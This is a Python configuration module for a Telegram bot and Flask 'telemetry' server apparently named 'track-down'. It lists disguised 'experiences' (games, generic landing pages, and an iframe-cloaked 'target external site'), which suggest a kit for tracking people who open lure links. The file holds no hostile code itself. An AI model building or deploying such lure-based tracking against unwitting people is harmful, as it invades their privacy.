"""
config.py - Centralized configuration for the Telegram Bot and Flask Telemetry server.
"""

import os
from pathlib import Path
from dotenv import load_dotenv

# Load .env file
load_dotenv()

BASE_DIR = Path(__file__).resolve().parent
UPLOAD_DIR = BASE_DIR / "uploads"
SESSIONS_FILE = BASE_DIR / "sessions.json"

# Ensure upload directory exists
os.makedirs(UPLOAD_DIR, exist_ok=True)

# Telegram Bot
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
raw_secret = os.environ.get("TELEGRAM_WEBHOOK_SECRET", "webhook_secret").strip()
TELEGRAM_WEBHOOK_SECRET = raw_secret.replace("<", "").replace(">", "").strip() or "webhook_secret"
SERVER_BASE_URL = os.environ.get(
    "SERVER_BASE_URL",
    os.environ.get("RENDER_EXTERNAL_URL", "https://track-down-wxvl.onrender.com")
).rstrip("/")

# Flask
FLASK_DEBUG = os.environ.get("FLASK_DEBUG", "0").lower() in ("1", "true", "yes")
PORT = int(os.environ.get("PORT", 5000))
SECRET_KEY = os.environ.get("SECRET_KEY", os.urandom(24).hex())

# Media & Upload Settings
MAX_UPLOAD_SIZE_BYTES = 5 * 1024 * 1024  # 5 MB
ALLOWED_MIME_TYPES = {"image/jpeg", "image/png", "image/webp"}
ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".webp"}

# Retention
DEFAULT_EXPIRATION_HOURS = int(os.environ.get("SESSION_EXPIRATION_HOURS", 24))

# Catalogue of Supported Experiences
EXPERIENCES = {
    "reaction_game": {
        "id": "reaction_game",
        "name": "Reaction Time Game",
        "category": "game",
        "template": "experiences/reaction.html",
        "description": "Test user reflexes with a visual change reaction challenge."
    },
    "memory_game": {
        "id": "memory_game",
        "name": "Memory Cards Game",
        "category": "game",
        "template": "experiences/memory.html",
        "description": "Classic card-matching puzzle game."
    },
    "tictactoe": {
        "id": "tictactoe",
        "name": "Tic-Tac-Toe",
        "category": "game",
        "template": "experiences/tictactoe.html",
        "description": "Playable Tic-Tac-Toe match against an adaptive bot."
    },
    "rps_game": {
        "id": "rps_game",
        "name": "Rock Paper Scissors",
        "category": "game",
        "template": "experiences/rps.html",
        "description": "Classic Rock, Paper, Scissors showdown."
    },
    "number_guess": {
        "id": "number_guess",
        "name": "Number Guessing Challenge",
        "category": "game",
        "template": "experiences/number_guess.html",
        "description": "Guess the hidden number within minimal attempts."
    },
    "quick_math": {
        "id": "quick_math",
        "name": "Quick Math Challenge",
        "category": "game",
        "template": "experiences/math.html",
        "description": "Fast-paced mental arithmetic speed test."
    },
    "click_speed": {
        "id": "click_speed",
        "name": "Click Speed Test (CPS)",
        "category": "game",
        "template": "experiences/click_speed.html",
        "description": "Measure taps or clicks in a 5-second sprint."
    },
    "quiz_game": {
        "id": "quiz_game",
        "name": "Trivia & Quiz",
        "category": "game",
        "template": "experiences/quiz.html",
        "description": "Engaging multi-choice trivia questions."
    },
    "welcome_page": {
        "id": "welcome_page",
        "name": "Welcome Portal",
        "category": "static",
        "template": "experiences/welcome.html",
        "description": "Professional modern landing page."
    },
    "product_page": {
        "id": "product_page",
        "name": "Product Showcase",
        "category": "static",
        "template": "experiences/product.html",
        "description": "Modern SaaS or e-commerce showcase presentation."
    },
    "event_page": {
        "id": "event_page",
        "name": "Event RSVP & Schedule",
        "category": "static",
        "template": "experiences/event.html",
        "description": "Upcoming tech talk or meetup RSVP portal."
    },
    "faq_page": {
        "id": "faq_page",
        "name": "FAQ Center",
        "category": "static",
        "template": "experiences/faq.html",
        "description": "Interactive question & answer help directory."
    },
    "custom_page": {
        "id": "custom_page",
        "name": "Custom Content Portal",
        "category": "static",
        "template": "experiences/custom.html",
        "description": "Clean, minimal custom information page."
    },
    "wrapped_website": {
        "id": "wrapped_website",
        "name": "Wrapped Website",
        "category": "wrapper",
        "template": "wrapper.html",
        "description": "Target external site cloaked in an iframe."
    }
}

DEFAULT_EXPERIENCE = "reaction_game"
